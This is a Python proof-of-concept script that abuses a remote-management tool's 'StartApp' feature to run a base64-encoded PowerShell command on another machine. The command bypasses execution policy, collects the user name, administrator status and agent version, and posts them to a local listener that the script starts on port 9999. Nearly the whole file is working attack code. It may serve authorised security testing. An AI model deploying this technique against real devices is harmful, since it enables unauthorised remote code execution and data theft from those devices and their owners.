import subprocess
import json
import base64
import sys
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

response_data = []

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode('utf-8', errors='ignore')
        response_data.append(data)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def start_server():
    server = HTTPServer(('0.0.0.0', 9999), Handler)
    server.timeout = 10
    server.handle_request()

t = threading.Thread(target=start_server)
t.daemon = True
t.start()

ps_script = """
$u = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$v = "NONE"
if (Test-Path 'C:\\ProgramData\\DigiAgent\\installed_version.txt') {
    $v = (Get-Content 'C:\\ProgramData\\DigiAgent\\installed_version.txt').Trim()
}
$body = "User: $u | IsAdmin: $isAdmin | Version: $v"
Invoke-RestMethod -Uri 'http://192.168.1.150:9999' -Method Post -Body $body -ErrorAction SilentlyContinue
"""

b64 = base64.b64encode(ps_script.encode('utf-16le')).decode('ascii')
cmd = f"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {b64}"

payload = json.dumps({"applications": [cmd]})
cli = r"C:\Program Files\DigiAgent\digiagent-cli.exe"

print(f"Sending StartApp to 192.168.1.200...")
res = subprocess.run([cli, "feature", "start", "192.168.1.200", "StartApp", payload], capture_output=True, text=True)
print("Returncode:", res.returncode)
print("Stdout:", res.stdout.strip())
print("Stderr:", res.stderr.strip())

t.join(timeout=8)
if response_data:
    print("DEVICE RESPONSE:", response_data[0])
else:
    print("No HTTP response received within timeout.")
